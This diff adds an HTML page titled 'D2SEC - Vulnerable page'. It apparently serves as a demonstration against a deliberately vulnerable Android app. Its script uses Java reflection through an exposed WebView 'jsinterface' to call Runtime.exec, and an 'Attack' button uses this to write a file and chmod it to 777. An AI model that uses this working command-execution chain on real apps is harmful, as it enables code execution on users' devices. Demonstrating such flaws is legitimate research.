@@ -1,0 +1,39 @@
+<html>
+    <head>
+        <title>D2SEC - Vulnerable page</title>
+    </head>
+    <body>
+        <p>
+            Welcome to a vulnerable page. With some JS:
+
+            <script>
+                document.write("[D2] Written from JS !")
+            </script>
+            <br/>
+        </p>
+
+        <p>
+            [D2] Another JS (using js bridge):
+            <input type="button" value="ShowToast" onClick="showAndroidToast('[D2] Hello!')" />
+            <input type="button" value="Attack" onClick="attack()"/>
+
+            <script type="text/javascript">
+                function showAndroidToast(toast)
+                {
+                    jsinterface.showToast(toast);
+                }
+
+                function execute(cmd)
+                {
+                    return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+                }
+
+                function attack()
+                {
+                    execute(['/system/bin/sh', '-c', 'echo \"D2SEC !\" > /data/data/com.d2sec.vulnapp/d2sec.txt']);
+                    execute(['/system/bin/chmod', '777', '/data/data/com.d2sec.vulnapp/d2sec.txt']);
+                }
+            </script>
+        </p>
+    </body>
+</html>
